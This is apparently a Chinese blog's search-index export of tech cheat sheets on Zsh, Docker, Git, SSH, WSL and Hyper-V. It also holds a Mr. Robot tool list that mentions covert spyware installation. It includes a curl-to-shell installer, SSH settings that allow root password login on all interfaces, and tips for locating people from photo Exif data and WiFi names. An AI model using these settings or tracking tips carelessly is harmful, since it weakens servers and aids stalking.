Wellick用来Root同事的Android手机，这样他就可以隐藏在手机上安装的FlexiSPY间谍软件，以便获得关于谁将成为E公司的下一任首席技术官的秘密信息。 Kingo RootTyrell Wellick在第一季第3集中使用Kingo Root来Root同事的Android手机，这样他就可以在手机上隐蔽地安装FlexiSPY间谍软件，以便获得有关谁将成为下一任E公司首席执行官的秘密信息。 FlexiSPYFlexiSPY是针对Android，iOS和BlackBerry的间谍软件，允许用户监控受害者手机上的所有活动。在第一季第3集中，Tyrell Wellick秘密地将其安装在同事的Android手机上，以获取有关谁将成为下一任E公司首席技术官的秘密信息。 SuperSUSuperSU是一个在已Root的Android手机上管理超级用户权限的应用程序。在第一季第3集中，Tyrell Wellick在同事的Android手机上秘密安装了FlexiSPY —— 它使用SuperSU为它自己提供超级用户访问 —— 以便获得有关谁将成为下一任E公司首席技术官的秘密信息。 can-utilscan-utils包含与汽车电脑有关的实用程序。其中一个工具被称为candump，它在《黑客军团》中被用于入侵汽车的电脑。 radareradare2是Tyrell Wellick在第二季第12集中使用的逆向工程框架。 PyCharmPyCharm是一个Python和Django的IDE（集成开发环境），它是一种代码编辑软件。Trenton在第一季第四集中使用它。 TorTor被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，这个版本 —— 不像Tor浏览器 —— 可以用来托管隐藏服务，这是只能通过Tor访问的站点，并且其物理服务器位置被Tor匿名网络隐藏。Ray通过Tor隐藏服务运行着一条“丝绸之路”，他希望Elliot在第二季第5集中进行网站迁移。 PuTTYPuTTY是用于连接到Linux服务器的客户端。Elliot在第二季第4集和第5集使用PuTTY连接到运行Kali Linux的VPS（虚拟专用服务器），以便他可以在Ray的计算机上使用安装在VPS上的IRC客户端与Darlene聊天。他还在第二季第5集中使用PuTTY，完成了Ray的“丝绸之路”网站的迁移。 Mozilla FirefoxElliot使用Firefox作为他的默认浏览器。Trenton在第二季第8集中使用了Firefox。 FFmpeg在第二季第8集中Trenton使用FFmpeg编码一个视频，其中包含一个泄露的关于进行非法大规模监视的FBI电话会议，并通过Tor浏览器向Vimeo上传。 SlackwareSlackware是1993年创建的一个Linux发行版，旨在提高设计的稳定性和简单性，并成为最“类Unix”的Linux发行版。Slackware最初是基于Softlanding Linux系统的，它已经成为许多其他Linux发行版的基础，尤其是SUSE Linux发行版的第一个版本，也是最早的发行版本。在第二季第10集中，当Elliot与黑暗军队达成拯救Darlene生命的交易时，Leon给了他一台安装有Slackware的笔记本电脑，用于将黑暗军队的项目移动到刚果。 VLC Media PlayerVLC媒体播放器被用于第二季第4集，当时Elliot和Darlene一起观看了虚假恐怖片《Careful Massacre of the Bourgeoisie》的VHS版本。VLC也被用于第二季第8集，当fsociety预览一个他们将上传的关于非法大规模监视的泄露的FBI电话会议视频时。 Wayback Machine由Internet Archive运营的Waybach Machine是一个包含超过4,900亿个网页副本的数据库。在第二季第8集中FBI特工Dominique DiPierro向Mobley透露，联邦调查局使用了Wayback Machine，以便将他的黑客把柄与他为DJ Mobley创建的旧的粉丝页面联系起来。 µTorrent第二季第4集达琳用μTorrent下载了虚假恐怖电影《Careful Massacre of the Bourgeoisie》的VHS版本。]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[谈谈Android的root]]></title>
    <url>%2F2018%2F09%2F18%2Fandroid-root%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux小记]]></title>
    <url>%2F2018%2F09%2F18%2Ftmux%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim小记]]></title>
    <url>%2F2018%2F09%2F18%2Fvim%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Zsh替代Bash]]></title>
    <url>%2F2018%2F09%2F18%2Fzsh%2F</url>
    <content type="text"><![CDATA[众所周知，Bash几乎是所有Linux发行版预装的Shell，但Zsh却能带给你更强大的功能。 安装Zsh的安装很简单，在Ubuntu中，只需要apt install zsh一条命令即可，启用也很简单，chsh -s $(which zsh)即可，但它的配置却相当复杂，由此诞生了Oh My Zsh项目，该项目的主要目的是简化Zsh的配置。Oh My Zsh的官网给出了利用curl或wget安装的详细命令，具体如下：12345# 安装Oh My Zsh前需要安装git# 通过curl安装sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"# 通过wget安装sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)" 安装完成后，会在当前用户的家目录下生成多个隐藏文件：其中.zshrc类似于.bashrc，存放zsh的配置信息；.zsh_history类似于.bash_history，存放zsh的命令历史记录；.oh-my-zsh的文件夹则是Oh My Zsh项目GitHub仓库的克隆版，其中的themes文件夹下主要存放自带的主题，plugins文件夹下主要存放自带的插件，custom文件夹下主要存放用户自己下载的主题和插件。 配置Oh My Zsh的主要配置都位于$HOME/.zshrc文件中，主要配置如下：1234567891011121314151617# 配置主题，默认为自带的robbyrussell主题，# 个人喜欢自带的ys主题ZSH_THEME="ys"# 启动错误命令自动更正，默认是注释的ENABLE_CORRECTION="true"# 在命令执行的过程中，使用小红点进行提示# 默认是注释的COMPLETION_WAITING_DOTS="true"# 配置插件，默认只启用了自带的git插件,# 要启用更多的插件可直接在括号中写入，# 必须是自带的插件或已下载到指定位置的插件plugins=( git) 插件Zsh的强大之处就在于它有相当多的插件，只需安装相关插件，并进行配置，即可体验相应功能。Oh My Zsh安装并启用插件相当简便，所以，可把Oh My Zsh当成是一个Zsh的插件管理器。个人常用的插件如下： gitOh My Zsh自带的插件，用于显示Git仓库的分支等信息。 autojumpOh My Zsh自带的插件，实现快速跳转到指定文件夹，前提是要安装autojump命令行工具，apt install autojump即可。 zsh-autosuggestionsZsh下的命令自动建议插件，使用如下命令即可安装：1git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions zsh-completionsZsh下的命令自动补全插件，使用如下命令即可安装：1git clone https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions zsh-syntax-highlightingZsh下的命令语法高亮插件，使用如下命令即可安装：1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting 当安装并启用以上的所有插件后，$HOME/.zshrc文件中插件相关配置应该是下面这样的：123456789101112plugins=( git autojump zsh-autosuggestions zsh-completions zsh-syntax-highlighting)source $ZSH/oh-my-zsh.shsource ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh# 值得注意的是，根据官方文档，zsh-syntax-highlighting插件需放在最后，# 并且要加上相应的source语句 尾巴Oh My Zsh自带了很多主题，在这里可以查看每个主题的显示效果，可根据自己的喜好选择合适的主题，值得注意的是，当在$HOME/.zshrc配置文件中将主题设置为random时，它每次会选择随机的主题。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[reStructuredText小记]]></title>
    <url>%2F2018%2F09%2F17%2Frestructuredtext%2F</url>
    <content type="text"><![CDATA[reStructuredText是一种类似于Markdown的轻量标记语言，其含义为“重新构建的文本”，也被简称为reST，文件后缀名为.rst，是Python的Docutils项目的一部分，目前reST被广泛应用于编写Python文档。 基本语法标题列表和Markdown一样：- 无序列表项- 无序列表项- 无序列表项 1. 有序列表项2. 有序列表项3. 有序列表项 字体和Markdown一样：*斜体***粗体** 链接图片代码表格引用横线转义解析器]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用Let's Encrypt获取免费SSL证书]]></title>
    <url>%2F2018%2F09%2F16%2Flet-s-encrypt%2F</url>
    <content type="text"><![CDATA[Let’s Encrypt是一个免费、自动化和开放的证书颁发机构，它提供了一个工具：Certbot，可以用来获取SSL证书。进入Certbot的官网，根据自己的环境选择Web服务器和操作系统，即可得到详细的操作步骤，下面以Nginx Web服务器和CentOS 6操作系统为例，给出相关步骤： 安装12345# 下载certbot-auto脚本wget https://dl.eff.org/certbot-auto# 配置相关权限chmod a+x certbot-auto 配置请注意，获取或更新SSL证书之前需关闭相应的Web服务器，具体而言，需要执行service nginx stop。另外，第一次执行certbot-auto命令时，它会下载并安装相关环境，耐心等待即可。Certbot提供了一个Nginx插件，直接使用./certbot-auto --nginx即可完成所有配置。如果你想手动配置，可执行./certbot-auto certonly --standalone命令，此命令运行过程中会要求用户输入要获取SSl证书的域名，按要求输入即可，命令运行成功后会显示证书相关文件所在的目录。接下来只需在Nginx的配置文件nginx.conf中进行如下配置即可(以howiezhao.com域名为例)：123ssl on;ssl_certificate /etc/letsencrypt/live/howiezhao.com/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/howiezhao.com/privkey.pem; 更新Let’s Encrypt的证书默认时间为90天，当到期后，需要使用./certbot-auto renew命令进行证书更新。 更多要查看certbot-auto的更多命令，可以使用certbot-auto --help all命令查看之。要了解SSL的详细知识，可参考我之前写的笔记HTTPS运行机制。要了解Nginx的相关知识，可参考我之前写的笔记利用Nginx进行反向代理。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[库与框架]]></title>
    <url>%2F2018%2F09%2F16%2Flibrary-framework%2F</url>
    <content type="text"><![CDATA[软件开发中经常会有人混淆库与框架的含义，下面简单介绍之： 库库(library)是一个工具集，它不告诉你应该怎么做事，它只告诉你它能干什么事，具体干什么事，取决于使用者，比如，jQuery、Servlet等是一个个的库。库的优点是自由度高，可定制性强，较适用于小项目。 框架框架(framework)制定了一系列的规则，限定了你的行动，你必须遵循它制定的规则行事，但它却可以极大方便你的开发，比如，Angular、Spring等是一个个的框架。框架的优点是流程性高，便于开发，较适用于大项目。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用IPython替代原生Python Shell]]></title>
    <url>%2F2018%2F09%2F16%2Fipython%2F</url>
    <content type="text"><![CDATA[我算是个原教主义者，喜欢原生的东西，不太喜欢第三方的东西，但IPython相比原生Python Shell的众多优秀特性，让我不由得使用上它。 名称IPython最初只是一种基于Python的交互式解释器(REPL)，慢慢的，IPython项目中集成了许多新的工具，比如IPython Notebook，这是一种基于Web的强大编辑器。从IPython 4.0开始，IPython项目中和语言无关的工具已独立出来形成一个新的项目Jupyter，从此，IPython Notebook升级为Jupyter Notebook，开始支持更多的编程语言。而IPython将只专注于提供Python交互式解释器以及为Jupyter提供Python内核。当写这篇文章时，IPython的最新版本为6.5。如今，当你去IPython官网下载时，它会跳转到Jupyter的下载页面，因为Jupyter中已经包含了IPython，同时也建议下载Jupyter，因为其包含了强大的Jupyter Notebook，使用pip install jupyter即可下载，安装完成后直接输入ipython即可进入IPython交互式环境。 优势以下仅列出IPython相比原生Python Shell的一些优势： Tab自动补全 自动缩进 语法高亮 支持命令历史记录 命令前加!可调用系统命令 命令后加1个或2个?可方便查看对象信息 有众多的魔法函数(Magic Functions) 魔法函数以下仅列出IPython中使用较多的魔法函数：12345%timeit #测试代码段执行时间%hist #查看历史记录%debug #激活交互的调试器(ipdb)%load #加载外部代码%edit #使用编辑器打开 要查看更多的魔法函数，可以访问IPython的官方文档 Jupyter Notebook要启动Jupyter Notebook直接在命令行输入jupyter notebook即可，它会监听本机的8888端口，并自动打开浏览器访问。输入jupyter notebook --help可以查看它的更多参数。Jupyter Notebook默认采用Token的方式进行登录，启动后在命令行中会显示当前的token值，若没有自动打开浏览器，则可以复制命令行中带token的链接并在浏览器中打开即可。使用命令jupyter notebook --generate-config可生成Jupyter Notebook配置文件，默认为$HOME/.jupyter/jupyter_notebook_config.py文件。常用的配置项如下：12345678910111213141516171819# 配置是否允许root用户运行，改为`True`则允许c.NotebookApp.allow_root = False# 配置监听地址，改为`*`可监听所有IPc.NotebookApp.ip = 'localhost'# 配置启动后显示的目录，默认为启动时输入命令的目录c.NotebookApp.notebook_dir = ''# 配置启动时是否自动打开浏览器，若在远程服务器上启动Jupyter Notebook，# 则没必要打开浏览器，改为`False`即可c.NotebookApp.open_browser = True# 配置登录密码，需要存储密文形式，使用`jupyter notebook password`命令# 可生成加密后的密码c.NotebookApp.password = ''# 配置监听端口c.NotebookApp.port = 8888 最后，在Linux下，使用nohup jupyter notebook &gt; jupyter.log &amp;可使Jupyter Notebook在后台运行并记录日志到当前目录下的jupyter.log文件中。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[前端相关术语]]></title>
    <url>%2F2018%2F09%2F14%2Ffront-end-terminology%2F</url>
    <content type="text"><![CDATA[轮播图轮播图，在Bootstrap中又被称为Carousel，是当今网站主页非常常用的一种动态效果。 视差滚动视差滚动，又称Parallax Scrolling，指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。 ToolTipToolTip，在Bootstrap 4 中又被称为提示冒泡。 手风琴效果手风琴效果，又被称为Accordion。 哈林摇哈林摇，又称Harlem Shake。 响应式布局响应式布局，又称Responsive Layout，即一个布局可以适应多个不同终端。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站的WWW问题]]></title>
    <url>%2F2018%2F09%2F12%2Fweb-www%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LaTeX小记]]></title>
    <url>%2F2018%2F09%2F12%2Flatex%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[辗转相除法]]></title>
    <url>%2F2018%2F09%2F12%2Feuclidean%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[IRC是什么]]></title>
    <url>%2F2018%2F09%2F12%2Fwhat-is-irc%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ifconfig与ip]]></title>
    <url>%2F2018%2F09%2F12%2Fifconfig-ip%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巴科斯范式]]></title>
    <url>%2F2018%2F09%2F12%2Fbnf%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于人的信息收集]]></title>
    <url>%2F2018%2F09%2F09%2Fhuman-based-information-gathering%2F</url>
    <content type="text"><![CDATA[照片根据目标朋友圈、微博等社交网络所发的照片，查看Exif信息，可得到目标当时的位置、相机规格等信息。 WiFi根据目标所连接的WiFi名称可大致判断目标所在的位置，多数情况下，WiFi的名称一般为所在旅馆、餐馆、机构等名称的缩写。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入坑指南]]></title>
    <url>%2F2018%2F08%2F31%2Fdocker%2F</url>
    <content type="text"><![CDATA[Docker是一种基于Linux的容器化技术，类似于轻量的虚拟机。它采用C/S架构，使用Go语言开发。 版本Docker分为2个版本：社区版(Community Edition, CE)和企业版(Enterprise Edition, EE)，顾名思义，企业版是收费的。针对macOS10.10.3和Windows 10，Docker还推出了Docker Desktop，Docker Desktop又分为2个渠道(channel)，稳定渠道(Stable)和抢先渠道(Edge)，需要注意的是，Docker Desktop对系统是有要求的，例如，针对Win10的Docker for Windows因为要用到Hyper-V虚拟机，所以要求系统是64位专业版或企业版并开启Hyper-V功能。针对老版本的Windows或macOS，可以使用Docker Toolbox，它会附带安装一个VirtualBox虚拟机。使用docker version可以查看docker版本，直接输入docker可以查看docker相关命令。 镜像镜像(image)文件可以用来生成容器实例，其类似于在虚拟机中安装操作系统时所使用的ISO镜像。image文件可以包含一个tag(标签)，即版本号。你可以使用远程仓库中别人制作好的image文件，也可以自己制作image文件。要制作image文件就要编写Dockerfile文件，其类似于Makefile文件image的常用命令如下：12345678910111213141516# 列出本机的所有image文件docker image lsdocker images# 删除指定的image文件docker image rm [image-name]docker rmi [image-name]# 将指定的image文件从远程仓库拉取到本地docker image pull [image-name]docker pull [image-name]# 利用当前文件夹中的Dockerfile制作一个名为demo、tag为0.0.1的image文件# 若不指定tag，则默认的标签为latestdocker image build -t demo:0.0.1 .docker build -t demo:0.0.1 . 容器image文件生成的容器(container)实例，本身也是一个文件，称为容器文件。当关闭容器时，并不会删除容器文件，只是容器停止运行而已。类似于在虚拟机中安装的操作系统，其本身会在硬盘中创建一系列文件，当关闭操作系统时，相应的文件并不会删除。container的常用命令如下：123456789101112131415# 从指定的image文件生成一个正在运行的容器实例，# 若本地没有指定的image文件，会从远程仓库中自动抓取下来docker container run [image-name]docker run [image-name]# 列出本机正在运行的容器，使用参数`-all`列出所有容器文件docker container ls# 删除指定的容器文件docker container rm [container-id]docker rm [container-id]# 关闭指定的容器实例docker container kill [container-id]docker kill [container-id] 仓库仓库(repository)是不同标签的image的集合，注册处(registry)又是不同仓库的集合，Docker的官方Registry是Docker Hub，类似于GitHub。使用docker login可以登录到自己在Docker Hub上注册的帐号。值得注意的是，国内访问Docker Hub速度较慢，建议设置代理或使用国内镜像站。一般来说，国内镜像站只包含流行的公有镜像，私有镜像仍需要从Docker Hub中拉取。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git小记]]></title>
    <url>%2F2018%2F08%2F31%2Fgit%2F</url>
    <content type="text"><![CDATA[Git是目前最流行的分布式版本控制系统(Distributed Version Control System, DVCS)，所谓版本控制，即可以随时记录并切换文件的不同版本。 配置Git共有3个配置文件，分别是： /etc/gitconfig文件用于配置所有用户的配置信息，使用git config --system命令配置 某个用户主目录下的.gitconfig文件只适用于该用户，使用git config --global命令配置 当前Git仓库的.git/config仅针对当前项目，直接使用git config命令进行配置 注意：每一个级别会覆盖上一级别的配置，所以.git/config的配置变量会覆盖/etc/gitconfig中的配置变量。一般来说，针对新安装的Git环境，要配置如下信息：123456# 配置提交时使用的用户名和邮箱，必须配置git config --global user.name "Howie Zhao"git config --global user.email howiezhaohr@hotmail.com# 开启颜色显示git config --global color.ui true 另外，Git默认使用的编辑器是Vim，若要配置成自己喜欢的编辑器(如Emacs)，可使用命令：git config --global core.editor emacs。最后，你可以使用git config --list来查看所有配置信息。 结构要开始对某个项目进行版本控制，需要先在其所在路径下执行git init进行初始化，此命令会在当前路径下创建一个.git的隐藏文件夹，这就是Git仓库目录。Git分为3个区域，Git仓库、工作目录、暂存区域： Git仓库目录是Git用来保存项目的元数据和对象数据库的地方。这是Git中最重要的部分，从其它计算机克隆仓库时，拷贝的就是这里的数据。 工作目录是对项目的某个版本独立提取出来的内容。这些从Git仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。 暂存区域是一个文件，保存了下次将提交的文件列表信息，一般在Git仓库目录中。有时候也被称作“索引”，不过一般说法还是叫暂存区域。 基本的 Git 工作流程如下： 在工作目录中修改文件。 暂存文件，将文件的快照放入暂存区域。 提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录。 如果Git目录中保存着的特定版本文件，就属于已提交状态(committed)。如果作了修改并已放入暂存区域，就属于已暂存状态(staged)。如果自上次取出后，作了修改但还没有放到暂存区域，就是已修改状态(modified)。 命令使用git add test.txt可以将需要被追踪的文件(test.txt)添加到缓存区，使用git commit -m &#39;first commit&#39;可以将缓存区的内容提交到本地仓库，参数-m指定提交时的附带信息，使用git push可以将本地仓库推送到远程仓库，使用git clone可以将远程仓库克隆到本地，使用git pull可以将远程仓库的更新拉取到本地仓库。使用git status可以查看Git仓库状态，使用git log可以查看commit记录。 分支思想直接记录快照，而非差异比较：Git与其他版本控制系统的主要区别在于对待数据的方法，其他的VCS主要记录不同版本之间的差异，而Git则相当于直接记录不同版本的快照。近乎所有操作都是本地执行：在Git中的绝大多数操作都只需要访问本地文件和资源，一般不需要来自网络上其它计算机的信息。Git保证完整性：Git中所有数据在存储前都计算校验和(SHA-1)，然后以校验和来引用。这意味着不可能在Git不知情时更改任何文件内容或目录内容。若你在传送过程中丢失信息或损坏文件，Git就能发现。Git一般只添加数据：你执行的Git操作，几乎只往Git数据库中增加数据。很难让Git执行任何不可逆操作，或者让它以任何方式清除数据。 原理GitHub应明确一点，Git是由Linux创始人Linus Torvalds开发的分布式版本控制系统，而GitHub是使用Git实现的代码托管网站，两者并非一类。 更多在命令行中直接输入git，可查看相关命令，要了解更多关于Git的内容，可以参考《Pro Git》一书。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[telnet协议分析]]></title>
    <url>%2F2018%2F08%2F24%2Ftelnet%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH协议分析]]></title>
    <url>%2F2018%2F08%2F24%2Fssh%2F</url>
    <content type="text"><![CDATA[SSH(Secure Shell)即安全外壳协议，是一种位于应用层的加密的网络传输协议，虽然任何网络服务都可以通过SSH实现安全传输，但其最常见的用途还是远程登录，是Telnet等非安全Shell的替代品。 OpenSSH的运行机制SSH是一种协议，其实现多种多样，目前使用最广泛的实现是OpenSSH项目。当使用ssh user@host命令进行登录时，所完成的整个过程如下： 远程主机收到用户的登录请求，把自己的公钥发给用户 用户使用这个公钥，将登录密码加密后，发送给远程主机 远程主机用自己的私钥，解密登录密码，若密码正确，则同意用户登录 后续过程中，用户发送的信息都采用此方式进行加密发送 因为不像HTTPS协议，SSH协议的公钥是没有证书中心(CA)公证的，所以为了防止中间人攻击，当用户第一次登录远程主机时，系统会提示如下信息：123The authenticity of host 'host (12.18.429.21)' can't be established.RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.Are you sure you want to continue connecting (yes/no)? 即系统无法确认远程主机的真实性(远程主机有可能是中间人)，只知道远程主机的公钥指纹，询问用户是否继续连接。公钥指纹就是对公钥进行哈希计算得到的，为了方便用户的比较。用户并没有什么好的办法得知自己想要连接的真实远程主机的公钥指纹，一个可行的办法是远程主机在其官方网站上贴出自己的公钥指纹，方便用户和系统提示的指纹进行比较。假定当用户进行风险衡量后决定继续连接，接下来的过程就如上述提到的一样。远程主机的公钥会被保存在$HOME/.ssh/known_hosts文件中，当用户下次再连接时，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。除了采用口令登录外，还可使用公钥登录，原理为：用户将自己的公钥储存在远程主机上，登录时，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来，远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。OpenSSH提供了一个工具 —— ssh-keygen，使用它可以方便的生成一对公私钥，生成的公钥为id_rsa.pub，私钥为id_rsa，保存在$HOME/.ssh目录下，当然你可以使用-t参数指定密钥的类型，使用-f参数指定生成的目录，更多的参数可以使用--help参数查看。有了密钥对后，可以使用ssh-copy-id user@host命令将自己的公钥上传至远程主机，远程主机会将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys文件中。实际上，ssh-copy-id命令的整个过程就如下命令一样：1ssh user@host 'mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys' &lt; ~/.ssh/id_rsa.pub 最后还要对远程主机的SSH服务端配置文件，即/etc/ssh/sshd_config文件进行相关配置，并重启SSH服务即可生效。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WSL相关问题解决]]></title>
    <url>%2F2018%2F08%2F21%2Fwsl-problem%2F</url>
    <content type="text"><![CDATA[名称问题最早这个项目命名为Bash on Ubuntu on Windows，随后改名为Windows Subsystem for Linux，即WSL，值得肯定的是，随着Windows 10逐渐更新，慢慢统一了命名。 SSH问题要想在WSL中开启SSH服务，需要在配置文件(/etc/ssh/sshd_config)中作如下修改：12345Port 2222 #将22改为2222，因Win10中自带的SSH服务也在监听22端口ListenAddress 0.0.0.0 #取消注释，监听所有端口UsePrivilegeSeparation no #将yes修改为noPermitRootLogin yes #将prohibit-password修改为yes，允许root用户登录，视个人情况而定PasswordAuthentication yes #将no修改为yes，允许密码登录 修改完成后用sudo service ssh start启动SSH服务，可能会报如下错误：1234Could not load host key: /etc/ssh/ssh_host_rsa_keyCould not load host key: /etc/ssh/ssh_host_dsa_keyCould not load host key: /etc/ssh/ssh_host_ecdsa_keyCould not load host key: /etc/ssh/ssh_host_ed25519_key 并且此时无法使用SSH客户端连接到服务器端，客户端会报如下错误：1Connection closed by 127.0.0.1 port 2222 造成这种情况的原因是服务端在启动SSH服务时发现加密过程中需要用到的密钥文件未找到，可依次用如下命令生成所需文件：1234ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_keyssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_keyssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_keyssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key 其中-t参数表示加密类型，-f参数表示生成的密钥文件名，错误信息中缺少什么密钥按需生成即可。之后再重新启动SSH服务即可正常工作。 图形界面问题EXE程序问题netstat和ps]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Studio模拟器相关问题解决]]></title>
    <url>%2F2018%2F08%2F21%2Fandroid-emulator-problem%2F</url>
    <content type="text"><![CDATA[网络问题 命令行启动Android SDK工具包中包含着一个模拟器的命令行程序 —— emulator，它可以在不启动Android Studio的情况下开启Android模拟器，在Windows系统中，emulator位于%LOCALAPPDATA%\Android\Sdk\tools文件夹下，emulator -list-avds命令可以列出所有已创建的AVD，emulator -avd &lt;avd-name&gt;命令即可启动相应的AVD，要查看emulator更多的参数，可以使用emulator -help。 最佳实践建议创建的AVD为Pixel，版本为Android 7.1.1。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hyper-V相关问题解决]]></title>
    <url>%2F2018%2F08%2F20%2Fhyper-v-problem%2F</url>
    <content type="text"><![CDATA[全屏问题由于Hyper-V最初是为服务器设计的，所以到目前为止，Hyper-V对于全屏的支持没有VMware做得好，同样，Hyper-V也不能像VMware那样随意更改窗口大小，这多少显得很不方便。对于Windows虚拟机的全屏操作，目前较为理想的解决方案是使用远程桌面连接，记得要在虚拟机中开启远程桌面连接功能；而对于Linux虚拟机的全屏操作，可以通过修改/etc/default/grub文件，更改其中GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash video=hyperv_fb:1920x1080&quot;，接着update-grub并重启即可。 显卡问题开启Hyper-V功能后，原主机的显卡可能会出现问题，对于我的1803版Win10来说，电脑中原来的Intel(R) HD Graphics 4600核芯显卡不能正常工作，具体表现在工具栏中英特尔核芯显卡控制面板图标消失，以及系统设置中莫名出现多个显示器，最直观的感受是每当点亮屏幕，图像显示会变慢，并且有一个逐渐适配屏幕大小的过程。究其原因是系统中原本的4624版驱动程序与Hyper-V不兼容，解决办法是去官网下载最新版驱动程序并升级即可。 兼容性问题由于Hyper-V采用的是硬件虚拟化技术，所以开启Hyper-V功能后相当于原本的物理机也运行在虚拟化上了，因此不能再使用VMware或者VirtualBox，它们不允许在虚拟机上运行虚拟机，而此时原主机在它们眼中就是一个虚拟机。早期的Android Studio中自带的模拟器也会由于这种原因导致模拟器无法启动，只需将模拟器升级到最新版即可解决，Android Studio 3.1.4版之后自带模拟器(v27.3.9)已经可以支持Hyper-V，在开启Hyper-V的系统中，它使用Windows虚拟机监控程序平台替代了Intel的HAXM，使用前需要在Windows功能中启用Windows虚拟机监控程序平台功能。 网卡问题要想使Hyper-V中的虚拟机上网，可以通过创建虚拟交换机实现，虚拟交换机有3种类型，外部相当于VMware的桥接模式，内部相当于VMware的NAT模式，专用相当于VMware的仅主机模式，所有虚拟机会默认使用内部类型的默认交换机，这是虚拟交换机管理器自动创建的。如果我们选择创建外部类型的虚拟交换机，则会把Hyper-V的网络桥接在物理网卡上，那物理网卡将变成一个虚拟交换机。因此我们会发现原来使用的网卡变成了vEthernet，这是正常现象，不用担心。Hyper-V会自动创建一个虚拟网卡来继承原物理网卡的配置，物理计算机可以正常使用网络。 代数问题在创建虚拟机时可以选择虚拟机代数，简单来说，第一代虚拟机支持创建32位与64位操作系统，创建的虚拟硬盘为.vhd格式，第二代虚拟机只能创建64位操作系统，创建的虚拟硬盘为.vhdx格式，并且必须是Windows 8或者Windows Server 2012以上版本，对于Linux，微软官方有一份详细的清单表明哪些版本可以创建第二代虚拟机。为方便起见，可以在首次创建时选择第二代虚拟机，若不能成功启动，且屏幕显示No operating system was loaded. Press a key to retry the boot sequence...信息，则可以在设置中关闭安全启动并重启虚拟机，或者删掉虚拟机并重新创建第一代虚拟机。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
